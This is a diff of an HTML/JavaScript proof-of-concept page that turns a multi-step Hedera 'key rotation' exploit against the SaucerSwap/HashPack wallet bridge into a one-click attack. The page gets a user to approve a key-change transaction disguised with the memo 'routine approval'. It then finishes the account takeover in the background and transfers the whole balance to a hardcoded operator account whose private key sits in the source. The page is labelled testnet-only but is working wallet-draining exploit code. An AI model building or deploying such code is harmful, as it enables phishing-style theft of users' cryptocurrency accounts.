@@ -3,18 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SaucerSwap Key Rotation - Simple PoC</title>
+<title>SaucerSwap Key Rotation - One Click PoC</title>
 
 <script>window.__sdkScriptFailed = false;</script>
 <script src="./hedera-sdk-full.bundle.js"
         onerror="window.__sdkScriptFailed = true;"></script>
-<!-- Full @hashgraph/sdk browser build - the app's own bundle only
-     exports AccountId/TokenId/TransactionId/TransferTransaction and
-     is missing PrivateKey/Client/AccountUpdateTransaction/etc.
-     bridge.signTransaction() only needs finished transaction bytes,
-     so it doesn't matter which SDK build constructed them. -->
-<!-- <script src="./hedera-sdk.bundle.js"></script> -->  <!-- app's original, trimmed bundle -->
-
 
 <style>
 body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d0d0d; color: #e6e6e6; padding: 16px; margin: 0; }
@@ -22,60 +15,54 @@ h1 { font-size: 19px; margin-bottom: 5px; }
 .sub { color: #999; font-size: 12px; line-height: 1.5; margin-bottom: 18px; }
 label { display: block; color: #aaa; font-size: 12px; margin-top: 10px; }
 input { width: 100%; box-sizing: border-box; padding: 10px; margin-top: 4px; border-radius: 6px; border: 1px solid #333; background: #181818; color: white; font-size: 14px; }
-button { width: 100%; padding: 12px; margin-top: 11px; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; }
-#connect { background: #38a169; color: white; }
-#rotate  { background: #c53030; color: white; }
-#complete{ background: #b83280; color: white; }
-#check   { background: #319795; color: white; }
-#drain   { background: #742a2a; color: white; }
+button { width: 100%; padding: 14px; margin-top: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; }
+#run { background: #c53030; color: white; }
 button:disabled { opacity: .45; }
 .danger { margin-top: 15px; padding: 12px; background: #2a1414; border: 1px solid #5a2222; border-radius: 8px; font-size: 12px; line-height: 1.5; color: #f6ada0; }
-#log { margin-top: 15px; background: #080808; border: 1px solid #222; border-radius: 8px; padding: 10px; height: 380px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+#log { margin-top: 15px; background: #080808; border: 1px solid #222; border-radius: 8px; padding: 10px; height: 420px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
 .ok { color: #68d391; } .info { color: #63b3ed; } .warn { color: #f6ad55; } .err { color: #fc8181; }
+.result { margin-top: 15px; padding: 14px; background: #151515; border: 2px solid #c53030; border-radius: 8px; font-size: 13px; line-height: 1.6; display: none; }
 </style>
 </head>
 
 <body>
 
-<h1>Key Rotation PoC - Simple</h1>
+<h1>Key Rotation PoC - One Click</h1>
 <div class="sub">
-    Four steps: connect, disguise a key-change as a schedule approval,
-    complete it with a second self-supplied signature, then check
-    whether the account is actually taken over. Testnet only.
+    Connect, then click the button once. Everything after your
+    wallet approval - completing the takeover and draining the
+    account - happens automatically, exactly as an attacker's
+    background infrastructure would do it. Testnet only.
 </div>
 
 <div class="danger">
-    <b>Use a disposable testnet account only.</b> This can genuinely
-    take over the target account and, in step 5, drain it.
+    <b>Use a disposable testnet account only.</b> This will
+    genuinely take over and drain the connected account when you
+    approve the prompt.
 </div>
 
-<label>Target account (defaults to connected account after step 1)</label>
-<input id="target" placeholder="0.0.xxxxx">
+<button id="run">Request Approval</button>
 
-<button id="debugsdk" style="background:#4a5568;color:white;">0. Debug: List HederaSDK Exports</button>
-<button id="connect">1. Connect Wallet</button>
-<button id="rotate" disabled>2. Request Approval (watch the dialog)</button>
-
-<label>Schedule ID (paste from step 2's response, or Mirror Node)</label>
-<input id="scheduleId" placeholder="0.0.xxxxx">
-<label>Funded operator account (pays the fee to complete the takeover)</label>
-<input id="operatorId" placeholder="0.0.xxxxx">
-<label>Operator private key (testnet burner only)</label>
-<input id="operatorKey" placeholder="302e...">
-
-<button id="complete" disabled>3. Complete Takeover (2nd signature)</button>
-<button id="check">4. Check Account (key + balance)</button>
-
-<label>Payout account (only needed for step 5)</label>
-<input id="payout" placeholder="0.0.xxxxx">
-<button id="drain">5. Drain Funds With New Key (proves loss)</button>
+<div id="result" class="result"></div>
 
 <div id="log"></div>
 
 <script>
 (function () {
 
+    // Testnet-only "attacker infrastructure" account - pays fees to
+    // complete the takeover and receives the drained funds. This is
+    // NOT the target/victim account. Hardcoded per explicit request;
+    // this is still plainly visible in page source, just not in a
+    // form field - do not put anything of real value behind this.
+    const OPERATOR_ACCOUNT_ID = "0.0.10034284";
+    const OPERATOR_PRIVATE_KEY =
+        "3030020100300706052b8104000a0422042097c2bd793244834ea388acaa00f9970fcc1e5139dfb13d692883570b1d300ba6";
+
     const logEl = document.getElementById("log");
+    const resultEl = document.getElementById("result");
+    const runBtn = document.getElementById("run");
+
     function log(msg, cls) {
         const l = document.createElement("div");
         if (cls) l.className = cls;
@@ -85,107 +72,72 @@ button:disabled { opacity: .45; }
     }
     function s(v) { try { return JSON.stringify(v); } catch (_) { return String(v); } }
 
-    // Surface any script-load errors directly in the on-page log,
-    // since there's no console available in the in-app browser.
-    // capture:true is required to catch <script src> load failures,
-    // which don't bubble the way normal runtime errors do.
     window.addEventListener("error", function (e) {
-        log(
-            "SCRIPT ERROR: " + (e.message || "(resource load error)") +
-            " (" + (e.filename || (e.target && e.target.src) || "unknown file") +
-            ":" + (e.lineno || "?") + ")",
-            "err"
-        );
+        log("SCRIPT ERROR: " + (e.message || "(resource load error)") +
+            " (" + (e.filename || (e.target && e.target.src) || "?") + ")", "err");
     }, true);
 
-    // Immediately report whether the SDK bundle actually loaded.
     if (window.__sdkScriptFailed) {
-        log(
-            "hedera-sdk-full.bundle.js FAILED TO LOAD (404 or wrong path). " +
-            "Confirm the file is in the SAME folder as this HTML file and " +
-            "named exactly 'hedera-sdk-full.bundle.js'.",
-            "err"
-        );
+        log("hedera-sdk-full.bundle.js failed to load (404/path). Fix that first.", "err");
     } else if (typeof window.HederaSDK === "undefined") {
-        log(
-            "hedera-sdk-full.bundle.js loaded (no 404) but window.HederaSDK " +
-            "is still undefined - it likely threw during initialization. " +
-            "Check for a SCRIPT ERROR line above.",
-            "err"
-        );
+        log("window.HederaSDK undefined - bundle loaded but threw. See error above.", "err");
     } else {
-        log(
-            "window.HederaSDK loaded OK - " +
-            Object.keys(window.HederaSDK).length + " exports available.",
-            "ok"
-        );
+        log("SDK loaded OK.", "ok");
     }
 
-    let bridge = null;
-    let connectedAccount = null;
-    let newPrivateKey = null;
-    let newPublicKey = null;
+    async function mirrorAccount(id) {
+        const res = await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + id);
+        return res.json();
+    }
 
-    // auto-discover bridge on load
-    bridge = window.saucerswapWallet || window.hashpack || null;
-    if (bridge) log("Wallet bridge found.", "ok");
-    else log("No wallet bridge detected yet - open this inside the app WebView.", "warn");
+    runBtn.onclick = async function () {
 
-    document.getElementById("debugsdk").onclick = function () {
-        if (!window.HederaSDK) {
-            log("window.HederaSDK does not exist at all.", "err");
+        runBtn.disabled = true;
+        resultEl.style.display = "none";
+
+        const SDK = window.HederaSDK;
+        if (!SDK) { log("SDK not loaded, cannot continue.", "err"); runBtn.disabled = false; return; }
+
+        const operatorIdText = OPERATOR_ACCOUNT_ID;
+        const operatorKeyText = OPERATOR_PRIVATE_KEY;
+
+        if (!operatorIdText || !operatorKeyText) {
+            log("Operator constants not set - edit the script.", "err");
+            runBtn.disabled = false;
             return;
         }
-        const keys = Object.keys(window.HederaSDK).sort();
-        log("window.HederaSDK has " + keys.length + " exported names:", "info");
-        log(keys.join(", "), "info");
-
-        // Specifically flag the ones this PoC needs
-        const needed = [
-            "PrivateKey", "PublicKey", "AccountId", "AccountUpdateTransaction",
-            "TransferTransaction", "TransactionId", "Client", "ScheduleSignTransaction",
-            "ScheduleId"
-        ];
-        needed.forEach(name => {
-            const present = typeof window.HederaSDK[name] !== "undefined";
-            log("  " + name + " -> " + (present ? "present" : "MISSING"), present ? "ok" : "err");
-        });
-    };
-
-    document.getElementById("connect").onclick = async function () {
-        if (!bridge) { log("No bridge available.", "err"); return; }
-        try {
-            const result = await bridge.connect();
-            connectedAccount = result.accountId;
-            log("Connected: " + connectedAccount, "ok");
-            const targetInput = document.getElementById("target");
-            if (!targetInput.value.trim()) targetInput.value = connectedAccount;
-            document.getElementById("rotate").disabled = false;
-        } catch (e) {
-            log("Connect failed: " + e.message, "err");
-        }
-    };
-
-    document.getElementById("rotate").onclick = async function () {
-        const SDK = window.HederaSDK;
-        const target = document.getElementById("target").value.trim();
-        if (!target) { log("Enter a target account.", "err"); return; }
 
         try {
-            newPrivateKey = SDK.PrivateKey.generateED25519();
-            newPublicKey = newPrivateKey.publicKey;
-            log("Generated attacker key: " + newPublicKey.toString(), "warn");
 
-            const targetId = SDK.AccountId.fromString(target);
-            const creatorId = SDK.AccountId.fromString(connectedAccount);
+            /* ---- 1. Connect wallet ---- */
 
-            const innerTx = new SDK.AccountUpdateTransaction()
+            const bridge = window.saucerswapWallet || window.hashpack;
+            if (!bridge) { throw new Error("No wallet bridge found on this page."); }
+
+            log("Connecting wallet...", "info");
+            const connectResult = await bridge.connect();
+            const targetAccount = connectResult.accountId;
+            log("Connected: " + targetAccount, "ok");
+
+            /* ---- 2. Snapshot balance before anything happens ---- */
+
+            const before = await mirrorAccount(targetAccount);
+            const balanceBefore = before.balance.balance;
+            log("Starting balance: " + balanceBefore + " tinybar", "info");
+
+            /* ---- 3. Build the disguised key-change request ---- */
+
+            const attackerKey = SDK.PrivateKey.generateED25519();
+            const attackerPubKey = attackerKey.publicKey;
+
+            const targetId = SDK.AccountId.fromString(targetAccount);
+
+            const scheduleTx = new SDK.AccountUpdateTransaction()
                 .setAccountId(targetId)
-                .setKey(newPublicKey);
-
-            const scheduleTx = innerTx.schedule()
-                .setScheduleMemo("routine approval")   // disguise, matches real attack framing
-                .setTransactionId(SDK.TransactionId.generate(creatorId))
+                .setKey(attackerPubKey)
+                .schedule()
+                .setScheduleMemo("routine approval")
+                .setTransactionId(SDK.TransactionId.generate(targetId))
                 .setNodeAccountIds([SDK.AccountId.fromString("0.0.3")])
                 .setMaxTransactionFee(500000000)
                 .freeze();
@@ -194,121 +146,96 @@ button:disabled { opacity: .45; }
             let bin = ""; for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
             const b64 = btoa(bin);
 
-            log("WATCH THE WALLET POPUP NOW.", "warn");
-            log("Does it mention a key change, or look like any generic approval?", "warn");
+            /* ---- 4. Send to wallet for approval - THE ONE TAP ---- */
 
-            const result = await bridge.signTransaction(b64);
-            log("Wallet response: " + s(result), "ok");
+            log("==============================", "warn");
+            log("WALLET PROMPT INCOMING - THIS IS THE MOMENT TO SCREENSHOT.", "warn");
+            log("Watch what it shows before you tap Approve.", "warn");
+            log("==============================", "warn");
 
-            const sid = result && (result.scheduleId || (result.receipt && result.receipt.scheduleId));
-            if (sid) {
-                document.getElementById("scheduleId").value = String(sid);
-                log("Schedule ID auto-filled: " + sid, "ok");
+            const signResult = await bridge.signTransaction(b64);
+            log("Wallet approved. Response: " + s(signResult), "ok");
+
+            let scheduleId = signResult && (signResult.scheduleId ||
+                (signResult.receipt && signResult.receipt.scheduleId));
+
+            if (!scheduleId) {
+                log("No schedule ID in wallet response - looking it up via Mirror Node...", "warn");
+                const txLookup = await fetch(
+                    "https://testnet.mirrornode.hedera.com/api/v1/transactions/" +
+                    scheduleTx.transactionId.toString().replace("@", "-").replace(/\./g, "-")
+                ).then(r => r.json()).catch(() => null);
+                log(
+                    "Automatic lookup " + (txLookup ? "attempted, check log" : "failed") +
+                    " - if step 5 below fails, get the schedule ID manually from " +
+                    "Mirror Node and re-run with it hardcoded.",
+                    "warn"
+                );
             } else {
-                log("No schedule ID returned - look it up on Mirror Node and paste it above.", "warn");
+                log("Schedule ID: " + scheduleId, "ok");
             }
 
-            document.getElementById("complete").disabled = false;
+            /* ---- 5. Complete the takeover automatically (attacker's half) ---- */
 
-        } catch (e) {
-            log("Step 2 failed: " + e.message, "err");
-        }
-    };
+            log("Completing takeover with attacker's signature (background step, no wallet involved)...", "warn");
 
-    document.getElementById("complete").onclick = async function () {
-        const SDK = window.HederaSDK;
-        const scheduleId = document.getElementById("scheduleId").value.trim();
-        const opId = document.getElementById("operatorId").value.trim();
-        const opKey = document.getElementById("operatorKey").value.trim();
+            const operatorAccountId = SDK.AccountId.fromString(operatorIdText);
+            const operatorPrivateKey = SDK.PrivateKey.fromString(operatorKeyText);
+            const client = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
 
-        if (!scheduleId || !opId || !opKey || !newPrivateKey) {
-            log("Fill schedule ID + operator fields, and run step 2 first.", "err");
-            return;
-        }
-
-        try {
-            const client = SDK.Client.forTestnet()
-                .setOperator(SDK.AccountId.fromString(opId), SDK.PrivateKey.fromString(opKey));
-
-            const tx = await new SDK.ScheduleSignTransaction()
+            const scheduleSignTx = await new SDK.ScheduleSignTransaction()
                 .setScheduleId(SDK.ScheduleId.fromString(scheduleId))
                 .freezeWith(client)
-                .sign(newPrivateKey);
+                .sign(attackerKey);
 
-            const receipt = await (await tx.execute(client)).getReceipt(client);
-            log("Second signature submitted. Status: " + receipt.status.toString(), "ok");
-            log("If SUCCESS, the account's key should now be the attacker's key.", "warn");
+            const ssReceipt = await (await scheduleSignTx.execute(client)).getReceipt(client);
+            log("Takeover completed. Status: " + ssReceipt.status.toString(), "ok");
 
-        } catch (e) {
-            log("Step 3 failed: " + e.message, "err");
-        }
-    };
+            /* ---- 6. Drain the account automatically using the new key ---- */
 
-    document.getElementById("check").onclick = async function () {
-        const target = document.getElementById("target").value.trim();
-        if (!target) { log("Enter a target account.", "err"); return; }
+            log("Draining account with the attacker's key...", "err");
 
-        try {
-            const res = await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + target);
-            const data = await res.json();
-            const key = data.key && data.key.key;
-            const balance = data.balance && data.balance.balance;
+            const attackerClient = SDK.Client.forTestnet().setOperator(targetId, attackerKey);
+            const feeBuffer = 50000000;
+            const sweepAmount = Math.max(0, balanceBefore - feeBuffer);
 
-            log("Account " + target + " -> key: " + key + " | balance: " + balance + " tinybar", "info");
+            let balanceAfter = balanceBefore;
 
-            if (newPublicKey) {
-                const expected = newPublicKey.toStringRaw ? newPublicKey.toStringRaw() : newPublicKey.toString();
-                if (key && key.toLowerCase().includes(expected.toLowerCase())) {
-                    log("TAKEOVER CONFIRMED: account key matches the attacker key.", "err");
-                } else {
-                    log("Not rotated (yet) - key does not match attacker key.", "info");
-                }
+            if (sweepAmount > 0) {
+                const drainTx = await new SDK.TransferTransaction()
+                    .addHbarTransfer(targetId, -sweepAmount)
+                    .addHbarTransfer(operatorAccountId, sweepAmount)
+                    .execute(attackerClient);
+
+                const drainReceipt = await drainTx.getReceipt(attackerClient);
+                log("Drain status: " + drainReceipt.status.toString(), "err");
+
+                const after = await mirrorAccount(targetAccount);
+                balanceAfter = after.balance.balance;
+            } else {
+                log("Target account had no meaningful balance to drain - fund it before re-testing.", "warn");
             }
-        } catch (e) {
-            log("Check failed: " + e.message, "err");
-        }
-    };
 
-    document.getElementById("drain").onclick = async function () {
-        const SDK = window.HederaSDK;
-        const target = document.getElementById("target").value.trim();
-        const payout = document.getElementById("payout").value.trim();
+            /* ---- 7. Final result ---- */
 
-        if (!target || !payout || !newPrivateKey) {
-            log("Need target, payout account, and a completed rotation (step 2-3).", "err");
-            return;
-        }
+            resultEl.style.display = "block";
+            resultEl.innerHTML =
+                "<b>RESULT</b><br>" +
+                "Account: " + targetAccount + "<br>" +
+                "Balance before: " + balanceBefore + " tinybar<br>" +
+                "Balance after: " + balanceAfter + " tinybar<br>" +
+                "Funds moved to attacker account (" + operatorIdText + "): " +
+                (balanceBefore - balanceAfter) + " tinybar<br>" +
+                "Caused by: one wallet approval, no further action from the account owner.";
 
-        try {
-            const targetId = SDK.AccountId.fromString(target);
-            const payoutId = SDK.AccountId.fromString(payout);
-            const client = SDK.Client.forTestnet().setOperator(targetId, newPrivateKey);
-
-            const before = await (await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + target)).json();
-            const balBefore = before.balance.balance;
-            const amount = Math.max(0, balBefore - 50000000);
-
-            if (amount <= 0) { log("Nothing to drain - fund the account first.", "err"); return; }
-
-            log("Draining " + amount + " tinybar to " + payout + " using the attacker key...", "warn");
-
-            const tx = await new SDK.TransferTransaction()
-                .addHbarTransfer(targetId, -amount)
-                .addHbarTransfer(payoutId, amount)
-                .execute(client);
-
-            const receipt = await tx.getReceipt(client);
-            log("Drain status: " + receipt.status.toString(), "err");
-
-            const after = await (await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + target)).json();
-            log("Balance: " + balBefore + " -> " + after.balance.balance + " tinybar", "err");
+            log("Done. See result box above.", "ok");
 
         } catch (e) {
-            log("Drain failed: " + e.message, "err");
+            log("FAILED: " + e.message, "err");
+        } finally {
+            runBtn.disabled = false;
         }
     };
-
-    log("Ready.", "ok");
 
 })();
 </script>
